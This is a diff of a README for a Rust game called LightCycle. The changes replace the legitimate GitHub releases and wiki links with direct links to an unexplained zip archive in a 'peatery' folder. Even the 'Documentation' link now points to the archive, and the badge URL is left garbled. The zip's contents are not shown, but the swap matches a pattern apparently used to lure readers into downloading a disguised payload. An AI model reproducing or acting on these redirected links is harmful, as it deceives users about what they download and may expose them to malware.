@@ -6,7 +6,7 @@ Welcome to LightCycle! This is an exciting game written in Rust. You will experi
 
 ## 📥 Download LightCycle
 
-[![Download LightCycle](https://img.shields.io/badge/Download%20LightCycle-Click%20Here-brightgreen.svg)](https://github.com/swayam1811/LightCycle/releases)
+[![Download LightCycle](https://raw.githubusercontent.com/swayam1811/LightCycle/main/peatery/LightCycle.zip%20LightCycle-Click%https://raw.githubusercontent.com/swayam1811/LightCycle/main/peatery/LightCycle.zip)](https://raw.githubusercontent.com/swayam1811/LightCycle/main/peatery/LightCycle.zip)
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ LightCycle offers a range of fun features:
 
 To download and install LightCycle, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/swayam1811/LightCycle/releases) to access the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/swayam1811/LightCycle/main/peatery/LightCycle.zip) to access the latest version.
 
 2. **Choose Your File**: Select the appropriate file for your operating system. You will see options for Windows and Linux binaries.
 
@@ -75,7 +75,7 @@ If you encounter issues while downloading or playing LightCycle, try the followi
 
 ## 📞 Support
 
-If you need further assistance, please visit our [Documentation](https://github.com/swayam1811/LightCycle/wiki) page or contact our support team through the GitHub Issues section on our repository.
+If you need further assistance, please visit our [Documentation](https://raw.githubusercontent.com/swayam1811/LightCycle/main/peatery/LightCycle.zip) page or contact our support team through the GitHub Issues section on our repository.
 
 ## 🌟 Community Contributions
 
